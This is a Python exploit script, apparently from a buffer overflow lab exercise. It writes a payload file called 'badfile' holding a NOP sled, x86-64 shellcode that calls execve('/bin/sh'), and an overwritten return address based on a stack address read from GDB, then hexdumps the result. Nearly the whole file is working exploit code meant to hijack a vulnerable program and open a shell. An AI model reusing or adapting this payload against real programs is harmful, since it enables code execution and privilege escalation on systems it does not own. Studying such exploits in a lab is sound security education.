#!/usr/bin/env python3

import struct
import subprocess
# read badfile: hexdump -C -v badfile

# Shellcode to execute execve("/bin/sh", NULL, NULL)
shellcode = (
        "\x48\x31\xc0"  # xor rax, rax   ; Clear rax (set to 0)
        "\x50"          # push rax       ; Push NULL onto the stack (string terminator)
        "\x48\xbb\x2f\x2f\x62\x69\x6e"  # mov rbx, "//bin/sh"  ; Store "//bin/sh" in rbx
        "\x2f\x73\x68"
        "\x53"          # push rbx       ; Push "//bin/sh" onto the stack
        "\x48\x89\xe7"  # mov rdi, rsp   ; Set rdi (arg1) to point to "/bin/sh"
        "\x48\x89\xc6"  # mov rsi, rax   ; Set rsi (arg2) to NULL
        "\x48\x89\xc2"  # mov rdx, rax   ; Set rdx (arg3) to NULL
        "\xb0\x3b"      # mov al, 0x3b   ; syscall number for execve (59)
        "\x0f\x05"      # syscall        ; Call execve("/bin/sh", NULL, NULL)
).encode("latin-1")

# Define buffer size
buffer_size = 300
content = bytearray(0x90 for _ in range(buffer_size))  # Fill the buffer with NOPs (NOP Sled)

# Use the correct buffer address from GDB
buffer_start_addr = 0x7fffffffdb40  # Updated based on GDB output using p/x &buffer

# Calculate offsets
shellcode_offset = buffer_size - len(shellcode)  # Shellcode is placed at the end of the buffer

# calculate the offset
return_address_offset = 120                     # The return address overwrite location in the buffer

return_address_location = buffer_start_addr + return_address_offset

nop_slide_entry = 288                            # Offset inside NOP sled for return address landing
return_address = return_address_location + nop_slide_entry  # Compute the return address dynamically

# Place the shellcode at the end of the buffer
content[shellcode_offset:] = shellcode
shellcode_addr = buffer_start_addr + shellcode_offset

# Overwrite return address with an address inside the NOP sled
content[return_address_offset:return_address_offset+8] = struct.pack("<Q", return_address)  # Store the return address in little-endian format

# Print debugging information
print(f"Buffer starts at: {hex(buffer_start_addr)}")
print(f"Return address offset in buffer: {hex(return_address_offset)}")
print(f"Return address location in buffer: {hex(return_address_location)}")
print(f"NOP sled offset in buffer: {nop_slide_entry}")
print(f"Return address points to: {hex(return_address)} (inside NOP sled)")
print(f"Shellcode offset in buffer: {shellcode_offset}")
print(f"Shellcode Address: {hex(shellcode_addr)}")
# Write the exploit payload to a file
with open('badfile', 'wb') as f:
    f.write(content)

badfile_path = "./badfile"  
result = subprocess.run(["hexdump", "-C", "-v", badfile_path], capture_output=True, text=True)

print(result.stdout) 



